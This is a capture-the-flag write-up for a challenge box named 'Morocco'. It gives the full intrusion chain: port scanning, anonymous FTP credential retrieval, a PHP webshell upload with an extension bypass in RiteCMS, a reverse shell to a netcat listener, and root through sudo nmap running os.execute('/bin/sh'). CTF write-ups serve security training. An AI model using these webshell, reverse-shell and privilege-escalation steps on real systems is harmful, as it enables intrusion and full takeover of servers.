# Challenge Name: Morocco


![date](https://img.shields.io/badge/date-17.04.2022-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![category](https://img.shields.io/badge/category-BOX-blueviolet.svg)   
![value](https://img.shields.io/badge/value-300-blue.svg)  

## Description

You got a free trip to Marrakech, but avoid meeting Niba. 

159.65.224.214 

_Author : EddieMora_

## Detailed solution

I started by doing a nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn 159.65.224.214
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-17 02:12 UTC
Nmap scan report for 159.65.224.214
Host is up (0.21s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              25 Apr 05 23:05 backup
|_ftp-bounce: bounce working!
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:41.248.137.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 8a:6f:59:a6:13:1a:91:7c:27:c6:49:5d:f1:1d:d5:2a (ECDSA)
|_  256 04:3b:69:70:83:cf:01:d0:2f:bf:a2:65:2d:fe:b6:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Morocco
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.98 seconds

```

We have 3 ports 21, 22 and 80
- 21 has the vsftpd 3.0.3 with the anonymous login
- 80 has the webserver

### FTP

Let's login to ftp using anonymous login 

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 159.65.224.214                                                              148 ⨯ 3 ⚙
Connected to 159.65.224.214.
220 (vsFTPd 3.0.3)
Name (159.65.224.214:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (159,65,224,214,46,180).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              25 Apr 05 23:05 backup
226 Directory send OK.
ftp> cd backup
550 Failed to change directory.
ftp> ls
227 Entering Passive Mode (159,65,224,214,149,131).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              25 Apr 05 23:05 backup
226 Directory send OK.
ftp> ls -la
227 Entering Passive Mode (159,65,224,214,245,57).
150 Here comes the directory listing.
drwxr-xr-x    2 0        120          4096 Apr 05 23:05 .
drwxr-xr-x    2 0        120          4096 Apr 05 23:05 ..
-rw-r--r--    1 0        0              25 Apr 05 23:05 backup
226 Directory send OK.
ftp> mget backup
mget backup? y
227 Entering Passive Mode (159,65,224,214,245,22).
150 Opening BINARY mode data connection for backup (25 bytes).
226 Transfer complete.
25 bytes received in 0.00 secs (239.3536 kB/s)
```
Let's read the backup file

```bash
┌──(kali㉿kali)-[~]
└─$ file backup                                                                         
backup: ASCII text

┌──(kali㉿kali)-[~]
└─$ cat backup                                                                          
YWRtaW46bW9yb2NjbzIwMjI=

┌──(kali㉿kali)-[~]
└─$ echo "YWRtaW46bW9yb2NjbzIwMjI=" | base64 -d                                        
admin:morocco2022                                                
```
We found a login credentials maybe we can use it with webserver

### Webserver port 80

http://159.65.224.214

We have an html page and also a 404 page 

Let's try some directory bruteforcing 

```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://159.65.224.214/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr 17 02:11:05 2022
URL_BASE: http://159.65.224.214/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://159.65.224.214/ ----
==> DIRECTORY: http://159.65.224.214/content/
+ http://159.65.224.214/index.html (CODE:200|SIZE:1251)
+ http://159.65.224.214/server-status (CODE:403|SIZE:279)
```
I found a directory called /content

http://159.65.224.214/content/ we can a the end of page the version `RiteCMS version v3.0`

Searching for exploits, i found an Authenticated RCE exploit https://www.exploit-db.com/exploits/50616 

- Login to the admin portal `http://159.65.224.214/content/admin.php`
- We need to create a php webshell `<?php system($_GET['cmd']); ?>`
- Upload it in the file manager `http://159.65.224.214/content/admin.php?mode=filemanager&directory=media` 
- Try differnent extentions to bypass .htaccess `phtml worked for me` 

Now let's use our a php shell http://159.65.224.214/content/media/a.phtml?cmd=ls%20-la

```
drwxrwxr-x 3 root www-data 4096 Apr 17 02:34 .

drwxrwxr-x 7 root www-data 4096 Apr 6 01:07 ..

-rwxrwxr-x 1 root www-data 6148 Mar 8 2021 .DS_Store

-rw-r--r-- 1 root root 37 Apr 15 07:33 .htaccess

-rw-r--r-- 1 www-data www-data 771 Apr 17 01:47 404.php

-rw-r--r-- 1 www-data www-data 195469 Apr 17 02:32 Screenshot_2021-09-15_11_58_04.png

-rw-r--r-- 1 www-data www-data 195505 Apr 17 02:31 Screenshot_2021-09-15_11_58_05.png

-rw-r--r-- 1 www-data www-data 30 Apr 17 02:34 a.phtml

-rwxrwxr-x 1 root www-data 85630 Nov 24 2020 benjamin_child.jpg

-rwxrwxr-x 1 root www-data 62000 Nov 24 2020 contact.jpg

-rw-r--r-- 1 www-data www-data 46 Apr 17 02:30 cve-poc.PHtml

-rwxrwxr-x 1 root www-data 43333 Nov 24 2020 deanna_alys.jpg

-rw-r--r-- 1 www-data www-data 45 Apr 17 02:30 idk.pHp

-rw-r--r-- 1 www-data www-data 45 Apr 17 02:32 idk.phtml

-rw-r--r-- 1 www-data www-data 34282 Apr 17 02:28 ishell.php

-rwxrwxr-x 1 root www-data 24697 Nov 24 2020 jesus_kiteque.jpg

-rw-r--r-- 1 www-data www-data 5495 Apr 17 01:53 php-reverse-shell.phtml

-rw-r--r-- 1 www-data www-data 5495 Apr 17 01:54 php.png

-rwxrwxr-x 1 root www-data 55791 Nov 25 2020 product_devin_avery.jpg

-rwxrwxr-x 1 root www-data 16885 Nov 25 2020 product_devin_avery_s.jpg

-rwxrwxr-x 1 root www-data 37668 Apr 5 22:56 ritecms36.png

-rw-r--r-- 1 www-data www-data 34282 Apr 17 02:18 shell.php

-rwxrwxr-x 1 root www-data 2668638 Apr 5 22:46 slide1.png

-rwxrwxr-x 1 root www-data 2398456 Apr 5 22:47 slide2.png

-rwxrwxr-x 1 root www-data 4676969 Apr 5 22:49 slide3.png

-rwxrwxr-x 1 root www-data 5066739 Apr 5 22:50 slide4.png

-rwxrwxr-x 1 root www-data 2450605 Apr 5 22:52 slide5.png

drwxrwxr-x 2 root www-data 4096 Jan 19 2019 smilies

-rw-r--r-- 1 www-data www-data 10 Apr 17 02:20 state.php

-rw-r--r-- 1 www-data www-data 45 Apr 17 02:22 test1.php

-rw-r--r-- 1 www-data www-data 5495 Apr 17 02:33 test2.php

-rw-r--r-- 1 www-data www-data 1591 Apr 17 02:03 webshell.php
```

I used the php reverse shell https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

upload it the file manager and use the path of the file

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4646
listening on [any] 4646 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59596
Linux ubuntu-s-1vcpu-1gb-nyc1-01 5.4.0-107-generic #121-Ubuntu SMP Thu Mar 24 16:04:27 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 02:42:50 up  1:01,  1 user,  load average: 0.43, 0.51, 0.44
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    198.211.111.194  01:44   48.00s  0.16s  0.16s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu-s-1vcpu-1gb-nyc1-01:/$

```
I got the reverse shell, Let's stablize it using python3 (found it using which python3)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
stty raw -echo && fg
```
```bash
export TERM=xterm
```

At /home there is two user 


```
www-data@ubuntu-s-1vcpu-1gb-nyc1-01:/home/spipa7$ ls -la
total 24
drwxr-xr-x 3 spipa7   spipa7   4096 Apr  6 12:28 .
drwxr-xr-x 4 root     root     4096 Apr 14 22:50 ..
-rw------- 1 spipa7   spipa7     13 Apr  6 12:28 .bash_history
drwx------ 2 spipa7   spipa7   4096 Apr  6 12:23 .cache
---------- 1 root     root       64 Apr  6 10:08 key.txt
-rwxrwxrwx 1 www-data www-data  230 Apr  6 10:09 marrakech.mp3

```

spipa7 user has a mp3 file let's download it. I used the python http server python3 -m http.server 8080

The file is an archive let's unzip it

```bash
┌──(kali㉿kali)-[~]
└─$ unzip marrakech.mp3
Archive:  marrakech.mp3
  inflating: creds.txt

┌──(kali㉿kali)-[~]
└─$ cat creds.txt
Hmmm Good wlahila Good, Now you can pwn this!

Th1s_vite$$@1337

```  
I used su to switch to the user spipa7 using the password `Th1s_vite$$@1337` (Didn't check ssh) 

Let's check sudo 

```bash
$ sudo -l
Matching Defaults entries for spipa7 on ubuntu-s-1vcpu-1gb-nyc1-01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User spipa7 may run the following commands on ubuntu-s-1vcpu-1gb-nyc1-01:
    (r00t) /usr/bin/afrodisiac
    (root) /usr/bin/nmap

```
We can use nmap as sudo

https://gtfobins.github.io/gtfobins/nmap/

We can abuse the sudo privilges with nmap to preform privilege escalation

I tried first with the interactive mode but it's not supported

Let's use the script tag 

```bash
$ TF=$(mktemp)
$ echo 'os.execute("/bin/sh")' > $TF
$ sudo nmap nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-17 03:25 UTC
NSE: Warning: Loading '/tmp/tmp.NBuwiCQl1b' -- the recommended file extension is '.nse'.
# id
uid=0(root) gid=0(root) groups=0(root)
```
We got root!

Now let's search for the flag inside /root

```bash
drwx------  6 root root 4096 Apr  6 12:27 .
drwxr-xr-x 19 root root 4096 Apr 17 03:08 ..
lrwxrwxrwx  1 root root    9 Apr  6 12:27 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Apr  5 22:30 .cache
-rw-r--r--  1 root root    0 Apr 17 03:08 .cloud-locale-test.skip
drwxr-xr-x  3 root root 4096 Apr  5 22:33 .local
-rw-------  1 root root   18 Apr  5 23:29 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root    7 Apr  5 23:24 .sqlite_history
drwx------  2 root root 4096 Apr 17 03:20 .ssh
-rw-r--r--  1 root root  250 Apr 17 03:21 .wget-hsts
-rw-r--r--  1 root root   26 Apr  6 10:25 flag.txt
drwx------  3 root root 4096 Apr  5 22:29 snap
# cat: flag.txt
# thnb{G00d_Olah1l4_G00d@!}
```
The machine was open for all so i cleaned the privsec script and my reverse shell to keep it clean

```bash
$ cd /tmp
$ ls
tmp.NBuwiCQl1b  tmux-33
$ cat tmp.NBuwiCQl1b
os.execute("/bin/sh")
$ rm tmp.NBuwiCQl1b
```  

### Flag

```
thnb{G00d_Olah1l4_G00d@!}
```
